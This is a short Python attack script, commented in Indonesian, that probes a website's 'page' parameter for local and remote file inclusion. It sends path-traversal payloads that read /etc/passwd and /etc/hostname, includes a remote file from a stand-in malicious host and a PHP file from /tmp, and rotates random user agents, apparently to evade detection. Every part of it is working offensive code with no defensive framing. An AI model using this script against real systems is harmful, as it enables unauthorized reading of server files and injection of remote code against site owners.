import requests
import random
from fake_useragent import UserAgent

def get_random_user_agent():
    ua = UserAgent()
    return ua.random

def file_inclusion_attack(url, payloads, session):
    for payload in payloads:
        target_url = f"{url}?page={payload}"
        headers = {'User-Agent': get_random_user_agent()}
        
        try:
            response = session.get(target_url, headers=headers)
            if "root" in response.text or "etc" in response.text:
                print(f"File Inclusion successful at: {target_url} with payload: {payload}")
            else:
                print(f"File Inclusion failed at: {target_url}, status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error during File Inclusion attack: {e}")

def start_file_inclusion(url, session):
    # Payloads untuk File Inclusion
    payloads = [
        "../../../../etc/passwd",  # LFI untuk mengakses file passwd
        "../../../../etc/hostname",  # LFI untuk mengakses hostname
        "http://malicious-site.com/malicious_file.txt",  # RFI untuk menyisipkan file remote
        "../../../tmp/malicious_file.php"  # LFI untuk menyisipkan file lokal yang berbahaya
    ]
    file_inclusion_attack(url, payloads, session)
